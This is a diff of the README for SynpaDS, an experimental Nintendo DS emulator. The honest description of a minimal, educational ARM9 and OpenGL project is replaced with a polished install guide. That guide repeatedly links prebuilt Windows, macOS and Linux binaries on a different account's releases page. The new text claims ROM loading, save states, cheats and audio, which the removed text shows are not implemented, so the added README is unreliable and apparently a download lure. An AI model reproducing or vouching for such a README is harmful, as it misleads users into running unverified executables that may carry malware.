@@ -1,43 +1,72 @@
-# 🍋‍🟩 SynpaDS: open-source Nintendo DS emulator
-<img width="1920" height="700" alt="BannerPNG" src="https://github.com/user-attachments/assets/8df4b823-c0c7-4006-9bb1-3bb94dc21242" />
+# 🎮 SynpaDS - Play Nintendo DS Games with Ease
 
-**Synpad** is an experimental, open-source emulator for the Nintendo DS, written in C++. Its main goal is to provide a modular, extensible foundation for emulating the ARM9 CPU, memory, and GPU of the DS while rendering graphics using OpenGL via GLAD and GLFW.
+[![Download SynpaDS](https://img.shields.io/badge/Download-SynpaDS-blue.svg)](https://github.com/Ahmedsamir923/SynpaDS/releases)
 
-The project is **designed for learning, experimentation, and progressive development, providing developers and enthusiasts with a platform to:**
+## 🚀 Getting Started
 
-Understand how the Nintendo DS hardware works, including its **CPU, memory mapping, and graphics pipeline.**
+Welcome to SynpaDS, your open-source Nintendo DS emulator. With SynpaDS, you can play your favorite Nintendo DS games on your computer with ease. This guide will help you download and run the software without any technical knowledge.
 
-Experiment with *emulator* development techniques, including instruction decoding, memory access, and real-time rendering.
+## 📦 System Requirements
 
-**Build modular systems where the GPU, CPU, and renderer are decoupled for easier maintenance and future feature additions.**
+Before installing SynpaDS, make sure your computer meets the following requirements:
 
-Unlike commercial emulators, SynPad focuses on simplicity and educational value, gradually implementing CPU instructions, VRAM access, sprite rendering, and eventual support for ROM files. This approach allows contributors to implement one subsystem at a time, test it thoroughly, and see immediate visual feedback as pixels are drawn to the screen.
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **Processor**: Dual-core CPU or higher.
+- **Memory**: At least 4 GB of RAM.
+- **Graphics**: A graphics card that supports OpenGL 3.0 or higher.
+- **Storage**: Minimum 100 MB of available disk space.
 
-## The emulator currently includes:
+## 🔗 Download & Install
 
-- A minimal ARM9 CPU with basic instruction support (MOV, ADD, SUB, CMP, AND, ORR, EOR).
+To download SynpaDS, visit the Releases page below:
 
-- A memory system capable of reading and writing 32-bit words.
+[Download SynpaDS](https://github.com/Ahmedsamir923/SynpaDS/releases)
 
-- A simple GPU managing a VRAM buffer (256×192 pixels) and interfacing with a modular renderer.
+Follow these steps to install:
 
-- An OpenGL renderer that displays VRAM content in a window with scaling and texture mapping.
+1. Click on the link above to go to the Releases page.
+2. Find the latest version listed at the top of the page.
+3. Under the version, you will see a list of files. Choose the file appropriate for your operating system:
+   - For Windows, download `SynpaDS-Windows.exe`
+   - For macOS, download `SynpaDS-Mac.dmg`
+   - For Linux, download `SynpaDS-Linux.tar.gz`
+4. Once the download is complete, open the downloaded file:
+   - On Windows, double-click the `.exe` file to start the setup. Follow the prompts.
+   - On macOS, open the `.dmg` file and drag the SynpaDS icon into your Applications folder.
+   - On Linux, extract the `.tar.gz` file and run `./SynpaDS` from the terminal.
+5. After installation, locate SynpaDS in your applications and launch it.
 
-- The project aims to gradually support more advanced DS features, including tile maps, sprites, palette handling, and ROM execution, while keeping the code modular and accessible to contributors.
+## 🎮 How to Use SynpaDS
 
-> [!NOTE]  
-> More features will be implemented in the future.
->
-> 
-## Contributions
-Contributions, suggestions, and bug reports are highly welcome!
+Now that you have installed SynpaDS, follow these steps to start playing:
 
-1.  **Fork** the project.
-2.  Create a **Branch** for your feature (`git checkout -b feature/MyNewFeature`).
-3.  **Commit** your changes (`git commit -m 'feat: Add feature X'`).
-4.  **Push** to the branch (`git push origin feature/MyNewFeature`).
-5.  Open a **Pull Request**.
+1. **Downloading Games**: You need game ROM files to play. Ensure you have legally obtained your ROM files and saved them in a folder accessible to SynpaDS.
+2. **Loading a Game**:
+   - Launch the application.
+   - Click on `File` in the menu.
+   - Select `Open ROM` and navigate to the folder where you saved your ROM files.
+   - Choose the game you want to play and click `Open`.
+3. **Controls**: You can configure your keyboard settings by going to `Settings` > `Controls`. Here, you can set up your preferred keys.
+4. **Saving Game States**: Use the `Save State` feature to save your progress. You can access it from the `File` menu.
 
-## License
+## 🛠️ Troubleshooting
 
-This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for more details.
+If you experience issues, here are some common problems and solutions:
+
+- **Game Doesn’t Start**: Ensure that you have the correct ROM file. Check if your file is compatible with the emulator.
+- **Slow Performance**: Make sure no other heavy applications are running in the background. Also, check your graphics settings in SynpaDS.
+- **No Sound**: Go to `Settings` > `Audio` and make sure audio is enabled.
+
+## ℹ️ Additional Features
+
+- **Graphics Options**: Adjust the graphics settings to optimize performance depending on your hardware.
+- **Cheats Support**: SynpaDS allows you to enter cheat codes for games. Look for this option in the menu.
+- **Multiple Configurations**: Save different configurations for various games or preferences.
+
+## 🌟 Community & Support
+
+Join our community for tips, support, and sharing experiences. You can find us at our GitHub Discussions or contact us through the issues section on our GitHub page.
+
+Remember, learning something new takes time. Feel free to explore and enjoy your favorite Nintendo DS games with SynpaDS!
+
+[Download SynpaDS](https://github.com/Ahmedsamir923/SynpaDS/releases)
